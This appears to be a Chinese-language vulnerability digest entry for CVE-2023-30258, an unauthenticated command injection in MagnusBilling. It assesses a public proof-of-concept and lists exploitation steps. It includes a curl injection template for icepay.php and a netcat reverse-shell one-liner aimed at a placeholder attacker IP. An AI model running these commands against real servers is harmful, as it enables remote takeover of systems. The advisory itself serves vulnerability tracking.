## CVE-2023-30258-MagnusBilling-命令注入

**漏洞编号:** CVE-2023-30258

**漏洞类型:** 命令注入

**影响应用:** MagnusBilling

**危害等级:** 高危，允许未授权远程命令执行

**影响版本:** 6.x, 7.x

**利用条件:** 需要网络访问目标MagnusBilling服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-30258是MagnusBilling 6.x和7.x版本中的一个命令注入漏洞。攻击者可以通过发送特制的HTTP请求，利用`icepay.php`文件中的`democ`参数进行命令注入，无需身份验证即可在服务器上执行任意系统命令。\n\n**有效性分析：**\n根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，该漏洞的POC代码有效。多个来源均确认了该漏洞的存在和可利用性。\n\n**投毒风险分析：**\n提供的POC代码主要包含以下几个部分：\n1.  **漏洞验证：** 通过`sleep`命令测试是否存在命令注入，如果响应时间超过3秒，则认为存在漏洞。\n2.  **反弹shell：** 使用`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc attacker_ip 9001 >/tmp/f;`命令反弹shell到攻击者的机器。\n3.  **权限提升：** 尝试三种不同的权限提升方法（NATSec, SUID Bash, Jaxafed）。\n\n虽然POC代码自动化程度很高，包含多种权限提升方法，但是其中也可能存在风险：\n*   **依赖外部资源：** 反弹shell依赖攻击者控制的IP地址和端口。如果攻击者的服务器被入侵或者恶意利用，可能会影响目标系统。\n*   **权限提升的副作用：** SUID Bash方法可能引入安全风险，因为创建一个具有SUID权限的bash可能会被滥用。\n*   **Fail2ban滥用：** 通过fail2ban修改iptables存在一定的风险，例如可能导致服务异常。\n\n综合来看，该脚本的主要目的是为了自动化利用漏洞，但存在一些可能被滥用或者产生副作用的风险，投毒风险的可能性较低，约为10%。\n\n**利用方式：**\n1.  **确定目标MagnusBilling版本为6.x或7.x。**\n2.  **发送包含命令注入的HTTP GET请求到`/mbilling/lib/icepay/icepay.php`，利用`democ`参数执行任意命令。** 示例:`curl -s "http://target/mbilling/lib/icepay/icepay.php" --get --data-urlencode 'democ=;COMMAND;'`。\n3.  **通常利用反弹shell获取目标服务器的控制权，然后进行后续的攻击行为，例如数据窃取、权限提升等。**\n4.  **该PoC脚本尝试使用Fail2ban来执行命令，从而提权。**

**项目地址:** [delldevmann/CVE-2023-30258](https://github.com/delldevmann/CVE-2023-30258)

**漏洞详情:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)